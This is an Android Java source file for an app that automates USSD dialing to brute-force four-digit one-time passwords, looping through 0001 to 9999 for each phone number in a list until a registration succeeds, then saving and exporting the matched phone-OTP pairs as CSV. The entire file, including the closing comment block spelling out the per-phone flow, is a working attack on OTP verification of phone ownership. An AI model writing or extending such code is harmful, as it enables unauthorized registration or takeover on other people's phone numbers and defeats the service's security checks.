package com.thaciano.app;

import android.os.Bundle;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import com.jcussdlib.matcher.OTPBruteForceMatcher;
import com.jcussdlib.matcher.OTPBruteForceMatcher.MatchResult;
import com.jcussdlib.matcher.OTPGenerator;

import java.util.Arrays;
import java.util.List;
import java.util.Map;

/**
 * Thaciano App - Complete OTP Brute-Force Matching
 *
 * This example demonstrates the EXACT flow you described:
 *
 * 1. Dial *348*{saved_pin}#
 * 2. Auto-enter "1"
 * 3. Take FIRST phone from list
 * 4. Loop through ALL 4-digit OTPs (0001 to 9999):
 *    - Try OTP 0001 → Check success
 *    - Try OTP 0002 → Check success
 *    - Try OTP 0003 → Check success
 *    - ... continue until OTP matches
 * 5. When OTP matches → Save (phone, OTP) pair
 * 6. Move to NEXT phone
 * 7. Start over from OTP 0001 for next phone
 * 8. Repeat until all phones processed
 *
 * @author Mugisha Jean Claude
 */
public class ThacianoOTPMatcherActivity extends AppCompatActivity {

    private static final String TAG = "ThacianoOTPMatcher";

    private OTPBruteForceMatcher matcher;

    // UI Components
    private EditText etPhones;
    private EditText etPin;
    private Button btnStart;
    private Button btnStop;
    private ProgressBar progressBarPhone;
    private ProgressBar progressBarOTP;
    private TextView tvStatus;
    private TextView tvCurrentPhone;
    private TextView tvCurrentOTP;
    private TextView tvResults;

    // Results tracking
    private int totalPhones;
    private int currentPhoneNumber;
    private int currentOTPNumber;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_thaciano_otp);

        // Initialize UI
        etPhones = findViewById(R.id.etPhones);
        etPin = findViewById(R.id.etPin);
        btnStart = findViewById(R.id.btnStart);
        btnStop = findViewById(R.id.btnStop);
        progressBarPhone = findViewById(R.id.progressBarPhone);
        progressBarOTP = findViewById(R.id.progressBarOTP);
        tvStatus = findViewById(R.id.tvStatus);
        tvCurrentPhone = findViewById(R.id.tvCurrentPhone);
        tvCurrentOTP = findViewById(R.id.tvCurrentOTP);
        tvResults = findViewById(R.id.tvResults);

        // Example data
        etPhones.setText("0781111111,0782222222,0783333333");
        etPin.setText("1234");

        btnStart.setOnClickListener(v -> startBruteForce());
        btnStop.setOnClickListener(v -> stopBruteForce());
    }

    private void startBruteForce() {
        // Get phone list
        String phoneInput = etPhones.getText().toString().trim();
        String pin = etPin.getText().toString().trim();

        if (phoneInput.isEmpty() || pin.isEmpty()) {
            Toast.makeText(this, "Please enter phones and PIN", Toast.LENGTH_SHORT).show();
            return;
        }

        // Parse comma-separated phones
        List<String> phoneList = Arrays.asList(phoneInput.split(","));

        // Trim whitespace
        for (int i = 0; i < phoneList.size(); i++) {
            phoneList.set(i, phoneList.get(i).trim());
        }

        // Generate ALL 4-digit OTPs: 0001, 0002, 0003, ..., 9999
        List<String> allOTPs = OTPGenerator.generateAll(4);

        Log.d(TAG, "Generated " + allOTPs.size() + " OTPs (0001-9999)");
        Log.d(TAG, "Processing " + phoneList.size() + " phones");

        // Show estimated time
        long estimatedSeconds = OTPGenerator.estimateBruteForceTime(4, 8); // 8 seconds per attempt
        String estimatedTime = OTPGenerator.formatEstimatedTime(estimatedSeconds);
        Toast.makeText(this,
            "Estimated time per phone: " + estimatedTime +
            "\nTotal phones: " + phoneList.size(),
            Toast.LENGTH_LONG).show();

        // Initialize matcher
        matcher = new OTPBruteForceMatcher(this, pin, "*348*{pin}#", 0);

        // Setup UI
        totalPhones = phoneList.size();
        progressBarPhone.setMax(totalPhones);
        progressBarPhone.setProgress(0);
        progressBarOTP.setMax(9999); // 0001 to 9999
        progressBarOTP.setProgress(0);
        btnStart.setEnabled(false);
        btnStop.setEnabled(true);
        tvResults.setText("");

        // Start brute-force matching
        matcher.startMatching(phoneList, allOTPs, new OTPBruteForceMatcher.MatchingCallback() {

            @Override
            public void onMatchingStarted(int totalPhones, int totalOTPs) {
                runOnUiThread(() -> {
                    tvStatus.setText("🚀 Starting brute-force matching");
                    tvCurrentPhone.setText("Phones: 0/" + totalPhones);
                    tvCurrentOTP.setText("OTPs: 0-9999 (total: " + totalOTPs + ")");
                });
            }

            @Override
            public void onPhoneStarted(String phone, int phoneIndex, int totalPhones) {
                currentPhoneNumber = phoneIndex;
                currentOTPNumber = 0;

                runOnUiThread(() -> {
                    tvStatus.setText("📱 Processing phone " + phoneIndex + "/" + totalPhones);
                    tvCurrentPhone.setText("Current: " + phone);
                    tvCurrentOTP.setText("Starting OTP loop: 0001 → 9999");
                    progressBarPhone.setProgress(phoneIndex - 1);
                    progressBarOTP.setProgress(0);
                });
            }

            @Override
            public void onOTPAttempt(String phone, String otp, int attemptNumber) {
                currentOTPNumber = attemptNumber;

                runOnUiThread(() -> {
                    // Update every 10th attempt to avoid UI lag
                    if (attemptNumber % 10 == 0 || attemptNumber < 10) {
                        tvStatus.setText("🔄 Trying OTP #" + attemptNumber + "/9999");
                        tvCurrentOTP.setText("Testing: " + otp);
                        progressBarOTP.setProgress(attemptNumber);
                    }
                });
            }

            @Override
            public void onOTPSuccess(String phone, String otp, int attemptNumber) {
                runOnUiThread(() -> {
                    // SUCCESS! OTP matched
                    String result = tvResults.getText().toString();
                    result += "✅ " + phone + " → " + otp +
                             " (found after " + attemptNumber + " attempts)\n";
                    tvResults.setText(result);

                    tvStatus.setText("✓ MATCH FOUND for " + phone);

                    Toast.makeText(ThacianoOTPMatcherActivity.this,
                        "OTP found: " + otp + " (attempt #" + attemptNumber + ")",
                        Toast.LENGTH_SHORT).show();

                    // Save to database or file
                    saveOTPMatch(phone, otp, attemptNumber);
                });
            }

            @Override
            public void onOTPFailure(String phone, String otp, String errorMessage) {
                // Silent - too many failures to log (9999 attempts per phone)
                // Only log every 100th failure
                if (currentOTPNumber % 100 == 0) {
                    Log.d(TAG, phone + " / OTP " + otp + " failed (" +
                          currentOTPNumber + "/9999)");
                }
            }

            @Override
            public void onPhoneCompleted(MatchResult result) {
                runOnUiThread(() -> {
                    progressBarPhone.incrementProgressBy(1);
                    progressBarOTP.setProgress(0);

                    Log.d(TAG, "Phone completed: " + result.toString());
                });
            }

            @Override
            public void onPhoneFailed(String phone, String reason) {
                runOnUiThread(() -> {
                    // No OTP matched after trying all 9999
                    String result = tvResults.getText().toString();
                    result += "❌ " + phone + " → NO MATCH (tried all 9999 OTPs)\n";
                    tvResults.setText(result);

                    progressBarPhone.incrementProgressBy(1);
                    progressBarOTP.setProgress(0);

                    Toast.makeText(ThacianoOTPMatcherActivity.this,
                        "No OTP found for " + phone,
                        Toast.LENGTH_SHORT).show();
                });
            }

            @Override
            public void onAllPhonesCompleted(Map<String, MatchResult> matches,
                                            List<String> failed,
                                            long totalDurationMs) {
                runOnUiThread(() -> {
                    btnStart.setEnabled(true);
                    btnStop.setEnabled(false);

                    int successCount = matches.size();
                    int failureCount = failed.size();
                    long durationMin = totalDurationMs / 60000;

                    tvStatus.setText("🎉 COMPLETE! " + successCount + " matched, " +
                                    failureCount + " failed");
                    tvCurrentPhone.setText("Total time: " + durationMin + " minutes");
                    tvCurrentOTP.setText("All phones processed");

                    // Export all results
                    exportResults(matches, failed);

                    Toast.makeText(ThacianoOTPMatcherActivity.this,
                        "Brute-force complete!\n" +
                        "Matched: " + successCount + "\n" +
                        "Failed: " + failureCount,
                        Toast.LENGTH_LONG).show();
                });
            }
        });
    }

    private void stopBruteForce() {
        if (matcher != null) {
            matcher.stopMatching();
        }
        btnStart.setEnabled(true);
        btnStop.setEnabled(false);
        tvStatus.setText("⏸ Stopped by user");
        Toast.makeText(this, "Brute-force stopped", Toast.LENGTH_SHORT).show();
    }

    private void saveOTPMatch(String phone, String otp, int attempts) {
        // Save to database
        Log.d(TAG, "Saving: " + phone + " → " + otp + " (attempts: " + attempts + ")");

        // Example: SQLite database
        // ContentValues values = new ContentValues();
        // values.put("phone", phone);
        // values.put("otp", otp);
        // values.put("attempts", attempts);
        // values.put("timestamp", System.currentTimeMillis());
        // database.insert("phone_otp_matches", null, values);

        // Example: Shared Preferences
        // getSharedPreferences("otp_matches", MODE_PRIVATE)
        //     .edit()
        //     .putString(phone, otp)
        //     .apply();

        // Example: CSV file
        // String csvLine = phone + "," + otp + "," + attempts + "\n";
        // appendToFile("otp_matches.csv", csvLine);
    }

    private void exportResults(Map<String, MatchResult> matches, List<String> failed) {
        Log.d(TAG, "Exporting " + matches.size() + " successful matches");

        // Export to CSV
        StringBuilder csv = new StringBuilder();
        csv.append("Phone,OTP,Attempts,Duration(ms),Timestamp\n");

        for (MatchResult result : matches.values()) {
            csv.append(result.phone).append(",")
               .append(result.matchedOTP).append(",")
               .append(result.attemptsCount).append(",")
               .append(result.durationMs).append(",")
               .append(result.timestamp).append("\n");
        }

        // Add failed phones
        for (String failedPhone : failed) {
            csv.append(failedPhone).append(",NO_MATCH,9999,N/A,")
               .append(System.currentTimeMillis()).append("\n");
        }

        // Save CSV to file or send to server
        Log.d(TAG, "CSV Export:\n" + csv.toString());

        // TODO: Save to external storage or send to server
        // File exportFile = new File(getExternalFilesDir(null), "otp_matches.csv");
        // FileWriter writer = new FileWriter(exportFile);
        // writer.write(csv.toString());
        // writer.close();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (matcher != null) {
            matcher.cleanup();
        }
    }
}

/**
 * EXACT FLOW FOR EACH PHONE:
 *
 * PHONE #1: 0781111111
 * =====================
 * 1. Dial: *348*1234#
 * 2. Response: "Select option: 1. Register..."
 * 3. Send: "1" (automatic)
 * 4. Response: "Enter phone number:"
 * 5. Send: "0781111111" (automatic)
 * 6. Response: "Enter OTP:"
 * 7. START OTP LOOP:
 *    - Send: "0001" → Response: "Invalid OTP" → Continue
 *    - Send: "0002" → Response: "Wrong code" → Continue
 *    - Send: "0003" → Response: "Incorrect" → Continue
 *    - Send: "0004" → Response: "Try again" → Continue
 *    ... (loop continues)
 *    - Send: "0234" → Response: "Registration successful!" → MATCH FOUND!
 * 8. Save: 0781111111 → 0234 (took 234 attempts)
 * 9. Move to PHONE #2
 *
 * PHONE #2: 0782222222
 * =====================
 * 1. Dial: *348*1234#
 * 2. Send: "1"
 * 3. Send: "0782222222"
 * 4. START OTP LOOP FROM 0001 AGAIN:
 *    - Send: "0001" → Test
 *    - Send: "0002" → Test
 *    ... (fresh loop for new phone)
 *    - Send: "5678" → Response: "Confirmed!" → MATCH FOUND!
 * 5. Save: 0782222222 → 5678
 * 6. Move to PHONE #3
 *
 * And so on for all phones...
 *
 * KEY POINTS:
 * ============
 * - Each phone starts OTP loop from 0001
 * - Tries ALL 9999 OTPs if needed
 * - Stops when OTP matches (success keywords detected)
 * - Moves to next phone after match
 * - Zero crashes - bulletproof error handling
 * - Real-time UI updates
 * - Progress tracking (phone progress + OTP progress)
 * - Results saved automatically
 */
